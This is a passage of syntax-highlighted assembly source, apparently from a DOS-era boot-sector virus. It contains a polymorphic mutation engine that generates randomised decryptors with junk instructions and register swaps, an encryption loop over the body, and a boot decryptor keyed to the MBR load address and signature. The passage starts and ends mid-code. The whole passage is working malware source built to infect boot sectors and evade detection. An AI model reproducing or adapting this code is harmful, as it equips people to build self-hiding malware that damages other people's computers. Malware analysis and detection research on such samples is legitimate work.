</span><span class="sc5">@no_more_dec</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">@dece</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Main_Poly</span><span class="sc0">

</span><span class="sc1">; XOR BYTE PTR [XXXX],YY        80 36 XX XX YY</span><span class="sc0">
</span><span class="sc1">; SUB BYTE PTR [XXXX],YY        80 2E XX XX YY   xor 28h</span><span class="sc0">
</span><span class="sc1">; ADD BYTE PTR [XXXX],YY        80 06 XX XX YY</span><span class="sc0">

</span><span class="sc5">generator_table1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">do_crypt_inst</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">do_operation_one_byte</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">do_push_pop</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">do_operation_random_bytes</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">do_operation_two_random</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">do_operation_two_two</span><span class="sc0">

</span><span class="sc5">do_crypt_inst</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">04h</span><span class="sc0">             </span><span class="sc1">; Decryptor instruction number</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">             </span><span class="sc1">; Decryptor instruction kind</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc0"> </span><span class="sc1">; lengths</span><span class="sc0">

</span><span class="sc5">do_operation_one_byte</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">end_1_byte</span><span class="sc4">-</span><span class="sc5">do_operation_one_byte</span><span class="sc4">-(</span><span class="sc2">02d</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">01h</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">41h</span><span class="sc4">,</span><span class="sc2">42h</span><span class="sc4">,</span><span class="sc2">43h</span><span class="sc4">,</span><span class="sc2">44h</span><span class="sc4">,</span><span class="sc2">45h</span><span class="sc0">          </span><span class="sc1">; (incs) CX DX BX SP BP</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">49h</span><span class="sc4">,</span><span class="sc2">4ah</span><span class="sc4">,</span><span class="sc2">4bh</span><span class="sc4">,</span><span class="sc2">4ch</span><span class="sc4">,</span><span class="sc2">4dh</span><span class="sc0">             </span><span class="sc1">; (dec) CX DX BX SP BP</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">90h</span><span class="sc0">             </span><span class="sc1">; NOP</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">99h</span><span class="sc0">             </span><span class="sc1">; CWD</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0f8h</span><span class="sc0">            </span><span class="sc1">; CLC</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0f9h</span><span class="sc0">            </span><span class="sc1">; STC</span><span class="sc0">

</span><span class="sc5">end_1_byte</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc5">do_push_pop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">end_pushpop</span><span class="sc4">-</span><span class="sc5">do_push_pop</span><span class="sc4">-(</span><span class="sc2">02d</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">07h</span><span class="sc4">,</span><span class="sc2">017h</span><span class="sc4">,</span><span class="sc2">01fh</span><span class="sc0">             </span><span class="sc1">; POP</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">59h</span><span class="sc4">,</span><span class="sc2">5ah</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">5bh</span><span class="sc4">,</span><span class="sc2">5ch</span><span class="sc4">,</span><span class="sc2">5dh</span><span class="sc0">
</span><span class="sc5">end_pushpop</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc5">do_operation_random_bytes</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">end_3_bytes</span><span class="sc4">-</span><span class="sc5">do_operation_random_bytes</span><span class="sc4">-(</span><span class="sc2">04d</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ffh</span><span class="sc0">            </span><span class="sc1">; Register use</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">02h</span><span class="sc0">             </span><span class="sc1">; Random number length</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">01h</span><span class="sc0">             </span><span class="sc1">; Quantity of opcodes to copy from the table</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0a9h</span><span class="sc0">            </span><span class="sc1">; Test ax,xxxx</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0b9h</span><span class="sc4">,</span><span class="sc2">0bah</span><span class="sc4">,</span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc2">0bch</span><span class="sc4">,</span><span class="sc2">0bdh</span><span class="sc0">
                            </span><span class="sc1">; Mov Cx,xxxx... Dx,Bx,Sp,Bp</span><span class="sc0">
</span><span class="sc5">end_3_bytes</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc5">do_operation_two_random</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">end_2_rnd</span><span class="sc4">-</span><span class="sc5">do_operation_two_random</span><span class="sc4">-(</span><span class="sc2">04d</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ffh</span><span class="sc0">            </span><span class="sc1">; Needs number</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">01h</span><span class="sc0">             </span><span class="sc1">; Random length</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">01h</span><span class="sc0">             </span><span class="sc1">; Number of opcodes</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0a8h</span><span class="sc0">            </span><span class="sc1">; test al,xx</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0b1h</span><span class="sc4">,</span><span class="sc2">0b2h</span><span class="sc4">,</span><span class="sc2">0b3h</span><span class="sc4">,</span><span class="sc2">0b5h</span><span class="sc4">,</span><span class="sc2">0b6h</span><span class="sc4">,</span><span class="sc2">0b7h</span><span class="sc0"> </span><span class="sc1">;mov: cl dl bl ch dh bh</span><span class="sc0">
</span><span class="sc5">end_2_rnd</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc5">do_operation_two_two</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">end_two_two</span><span class="sc4">-</span><span class="sc5">do_operation_two_two</span><span class="sc4">)/</span><span class="sc2">2</span><span class="sc4">-(</span><span class="sc2">04d</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ffh</span><span class="sc0">            </span><span class="sc1">; Needs number</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">02h</span><span class="sc0">             </span><span class="sc1">; Random</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">02h</span><span class="sc0">             </span><span class="sc1">; Opcodes</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">08bh</span><span class="sc4">,</span><span class="sc2">01eh</span><span class="sc4">,</span><span class="sc2">08bh</span><span class="sc4">,</span><span class="sc2">02eh</span><span class="sc4">,</span><span class="sc2">08bh</span><span class="sc4">,</span><span class="sc2">0eh</span><span class="sc4">,</span><span class="sc2">08bh</span><span class="sc4">,</span><span class="sc2">09eh</span><span class="sc4">,</span><span class="sc2">08bh</span><span class="sc4">,</span><span class="sc2">0aeh</span><span class="sc0">  </span><span class="sc1">; mov reg,mem</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">08bh</span><span class="sc4">,</span><span class="sc2">026h</span><span class="sc4">,</span><span class="sc2">08bh</span><span class="sc4">,</span><span class="sc2">016h</span><span class="sc0">
</span><span class="sc5">end_two_two</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc5">crypts</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">34h</span><span class="sc4">,</span><span class="sc2">2ch</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">       </span><span class="sc1">; Last, kinda encryption</span><span class="sc0">
</span><span class="sc5">boot_decr_offset</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">boot_decr_inst</span><span class="sc0">
</span><span class="sc5">remaining</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">offset_codify</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">boot_decr_inst</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc1">; Can't touch SI, AX</span><span class="sc0">

</span><span class="sc1">;   New example:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">07c00h</span><span class="sc4">+</span><span class="sc2">512d</span><span class="sc4">-(</span><span class="sc5">boot_up_end</span><span class="sc4">-</span><span class="sc5">MBR_bootup</span><span class="sc4">)-</span><span class="sc2">2</span><span class="sc1">;200d+100h      ; 1 byte instr, dos dir</span><span class="sc0">
</span><span class="sc5">@place_to</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">02eh</span><span class="sc0">        </span><span class="sc1">; CS:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">80h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">34h</span><span class="sc0">          </span><span class="sc1">; Style ( with SI and AL )</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">          </span><span class="sc1">; Encryption value</span><span class="sc0">
 </span><span class="sc5">Crypt_value</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
 </span><span class="sc5">Encrypt_kind</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
 </span><span class="sc5">Looping_Crypt</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc0">
 </span><span class="sc5">Incer</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">02eh</span><span class="sc0">    </span><span class="sc1">;cs:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">0AA55h</span><span class="sc0">          </span><span class="sc1">; 55AAh</span><span class="sc0">
 </span><span class="sc5">SiInCmp</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc0">        </span><span class="sc1">; 3ch SI 3dh DI</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">Looping_Crypt</span><span class="sc0">
 </span><span class="sc5">Where_junz</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">Random_make</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">get_random</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5h</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0ddddh</span><span class="sc0">
</span><span class="sc5">@Xor_random</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">413h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">@Xor_random</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">51h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">               </span><span class="sc1">; Pointer to tables</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">



</span><span class="sc1">;   Takhisis was known also as having a lot of faces, and that's the way</span><span class="sc0">
</span><span class="sc1">; the children and the mad, the only brave enough to pronounce her name,</span><span class="sc0">
</span><span class="sc1">; called her at Hylo.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">


</span><span class="sc5">RNME</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc1">; The very first thingie is deciding if it will be xor, add</span><span class="sc0">
                </span><span class="sc1">;or sub</span><span class="sc0">

                </span><span class="sc1">; loop_dec + 2</span><span class="sc0">
                </span><span class="sc1">; crypt_file</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">30h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">aleatorio</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@crypt_with_xor</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@crypt_with_xor</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">

</span><span class="sc5">@crypt_with_xor</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">crypt_file</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">30h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@no_cambiar_crypt</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">

</span><span class="sc5">@no_cambiar_crypt</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">instrucciones</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">

                </span><span class="sc1">; Dx = Bp = start_crypt</span><span class="sc0">
                </span><span class="sc1">; Cx = encryption length</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">instrucciones</span><span class="sc4">+</span><span class="sc2">0fh</span><span class="sc4">],</span><span class="sc2">0e247h</span><span class="sc0">     </span><span class="sc1">; inc di/loop</span><span class="sc0">

        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">encrypt_val</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

</span><span class="sc5">crypt_file</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">crypt_file</span><span class="sc0">


        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">instrucciones</span><span class="sc4">+</span><span class="sc2">05h</span><span class="sc4">],</span><span class="sc2">0b9h</span><span class="sc0">   </span><span class="sc1">; mov cx,xxxx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">reentrant_flag</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bytes_referencia</span><span class="sc4">],</span><span class="sc2">0h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">restantes_poly</span><span class="sc4">],</span><span class="sc2">200h</span><span class="sc0">   </span><span class="sc1">; n.instr decryptor</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">numero_instruccion</span><span class="sc4">],</span><span class="sc2">4h</span><span class="sc0"> </span><span class="sc1">; n.util instrs</span><span class="sc0">

  </span><span class="sc1">; This first part of the poly engine fills the blanks of the four blocks</span><span class="sc0">
  </span><span class="sc1">;with random instructions</span><span class="sc0">



        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">instrucciones</span><span class="sc4">+</span><span class="sc2">3h</span><span class="sc1">;Instruct_new+3h</span><span class="sc0">
</span><span class="sc5">two_times</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">aleatorio</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">two_of_one</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">inst_2</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">next_inst_gen</span><span class="sc0">

</span><span class="sc5">two_of_one</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">inst_1</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">inst_1</span><span class="sc0">

</span><span class="sc5">next_inst_gen</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,(</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">instrucciones</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc0"> </span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">@di0dh</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">Instrucciones</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">two_times</span><span class="sc0">
</span><span class="sc5">@di0dh</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,(</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Instrucciones</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc0"> </span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">@end_filling</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">Instrucciones</span><span class="sc4">+</span><span class="sc2">0eh</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">inst_1</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">Instrucciones</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">two_times</span><span class="sc0">

</span><span class="sc5">@end_filling</span><span class="sc4">:</span><span class="sc0">



  </span><span class="sc1">; This part exchanges 50% times Si and Di registers, which are used in</span><span class="sc0">
  </span><span class="sc1">;the decryptor instructions</span><span class="sc0">


        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">aleatorio</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">instrucciones</span><span class="sc4">],</span><span class="sc2">0bfh</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">dontchangeem</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">instrucciones</span><span class="sc4">],</span><span class="sc2">0beh</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">instrucciones</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; encriptaci¢n</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">instrucciones</span><span class="sc4">+</span><span class="sc2">0fh</span><span class="sc4">],</span><span class="sc2">046h</span><span class="sc0">   </span><span class="sc1">; Para el Inc</span><span class="sc0">


</span><span class="sc5">dontchangeem</span><span class="sc4">:</span><span class="sc0">


  </span><span class="sc1">; Depending on a random value, cx is obtained by the normal way ( mov cx, )</span><span class="sc0">
  </span><span class="sc1">; or with a mov dx, register, mov cx,dx</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">aleatorio</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">cx_acabado</span><span class="sc0">
        </span><span class="sc6">cbw</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">siguiente_abajo</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">con_bp_cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">instrucciones</span><span class="sc4">+</span><span class="sc2">05h</span><span class="sc4">],</span><span class="sc2">0bbh</span><span class="sc0">       </span><span class="sc1">; mov bx,xxxx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">instrucciones</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">],</span><span class="sc2">0d989h</span><span class="sc0">     </span><span class="sc1">; mov cx,bx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">cx_acabado</span><span class="sc0">
</span><span class="sc5">con_bp_cx</span><span class="sc4">:</span><span class="sc0">
